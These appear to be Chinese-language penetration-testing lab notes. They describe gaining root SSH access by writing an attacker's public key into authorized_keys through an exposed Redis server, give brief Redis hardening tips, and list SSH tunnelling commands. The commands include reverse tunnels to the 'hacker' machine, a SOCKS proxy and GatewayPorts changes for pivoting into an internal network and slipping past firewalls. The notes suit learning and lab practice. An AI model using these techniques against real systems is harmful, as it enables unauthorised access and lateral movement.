redis和密钥登录

redis和密钥登录

前提:能连接对方的redis数据库

  1. 登录靶机的redis数据库
  2. 保存kali中的key
    1. 查看保存的key 并导出key保存到key.txt中(.ssh是隐藏文件夹)
    2. 把key.txt设置到redis数据库中,名字为aaa
    3. 进入数据库查看是否存在
    4. 进入到目标机的的.shh文件夹下
    5. 把aaa中的key存储到目标的.ssh下,名字为authorized_keys()
    6. 在目标机的.ssh文件夹中发现了authorized_keys
    7. ssh -i id_rsa root@192.168.80.135 直接使用ssh登录

redis安全

  1. 最好不要用root启动redis
  2. 单独为redis设置一个账号
  3. 设置本地的localhost不允许外部访问
  4. 保护模式protected-mode（默认开启）
  5. 可以考虑把端口修改为其他端口（默认6739）
  6. requirepass设置复杂的密码

ssh隧道

ssh隧道

黑客（ 192.168 .80.128）—-(192.168 .80 .174 )server1(192.168.132.134)—-(192.168.132.132)server2

正向隧道
  1. 在中转机上 映射内网ssh -CNfL 0.0.0.0:7777:192.168.132.132:80 root@127.0.0.1
  2. 在kali上输入中转机的ip端口登录
反向隧道
方法1

  1. 把本地的22端口映射到黑客的2222端口 ssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.80.128

  2. kali上 ssh -p 2222 root@127.0.0.1

  3. 请求内网网站

方法2
  1. 在中间机上把内网的80端口映射到kali的2223端口 ssh -qTfnN -R 2223:192.168.132.132:80 root@192.168.80.128
  2. 直接浏览器访问自己的2223端口

ssh本地socket代理

  1. kali上输入： ssh -qTfnN -D 7070 root@192.168.80.174
  2. 在火狐浏览器设置

ssh本地转发

  1. kali上，把内网主机的80端口转发到中间人的6666端口 ssh -L 127.0.0.1:6663:192.168.132.132:80 root@192.168.80.174 -fN

ssh远程转发访问

属于反向连接容易越过防火墙

  1. 中间机修改ssh配置

    1. nano /etc/ssh/sshd_config

    2. 找个空地方加入 GatwayPorts yes

  2. 在内网机中添加 ssh -R 8877:192.168.132.132:80 root@192.168.132.134 把自己映射到中间机的外网ip上

  3. 在kali上直接访问 192.168.80.174：8877端口即可
